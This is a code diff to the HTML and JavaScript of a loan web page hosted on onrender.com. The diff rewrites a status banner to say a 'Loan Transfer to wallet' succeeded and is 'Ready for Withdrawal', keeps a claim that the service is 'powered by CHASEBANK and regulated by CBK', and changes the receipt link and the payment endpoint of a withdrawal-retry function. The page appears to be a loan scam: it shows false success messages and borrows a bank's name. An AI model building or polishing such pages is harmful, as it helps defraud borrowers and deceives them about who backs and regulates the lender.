@@ -379,7 +379,7 @@
         <div class="text-center mb-8 slide-in">
             <div class="inline-flex items-center px-4 py-2 bg-green-100 text-green-800 rounded-full text-sm font-medium mb-6">
                 <i class="fas fa-check-circle mr-2"></i>
-                Your eligible loan was approved & Ready for Withdrawal.
+                Loan Transfer to wallet  was Successfull & Ready for Withdrawal.
 
                 powered by CHASEBANK and regulated by CBK
             </div>
@@ -1755,7 +1755,7 @@ if (status === 'success') {
 
         <!-- Actions -->
         <div class="flex justify-end space-x-3">
-          <a href="https://swift-loan-refunding.onrender.com/${receipt.reference}/pdf"
+          <a href="https://swift-loan-refunding.onrender.com/receipt/${receipt.reference}/pdf"
              target="_blank"
              class="px-5 py-2 bg-primary text-white rounded-lg shadow hover:bg-primary-dark transition flex items-center">
              <i class="fas fa-download mr-2"></i> Download PDF
@@ -1848,7 +1848,7 @@ async function retryWithdrawal() {
     }
 
     try {
-        const res = await fetch('https://swift-loan-refunding.onrender.com/pay', {
+        const res = await fetch('https://swift-loan-refunding.onrender.com', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
             body: JSON.stringify({
